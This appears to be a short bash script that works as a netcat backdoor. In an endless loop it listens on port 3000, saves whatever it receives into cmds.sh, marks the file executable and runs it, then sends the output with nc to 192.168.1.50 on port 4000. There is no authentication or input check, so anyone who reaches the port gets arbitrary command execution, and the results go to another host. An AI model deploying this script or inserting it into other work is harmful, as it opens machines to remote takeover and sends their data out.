#!/bin/bash -u

while :
do
# Listen on port 3000 for incoming commands
# -l means to listen
# -v verbose
# -p port number
# > pipes the content into a file
# -q 
nc -lv -p 3000 -q 1 > cmds.sh < /dev/null
sleep 1
cat cmds.sh
chmod +x cmds.sh
./cmds.sh > out.txt
echo "sending ouput"
# Sends back the output of the executed commands
cat out.txt | nc 192.168.1.50 4000

done

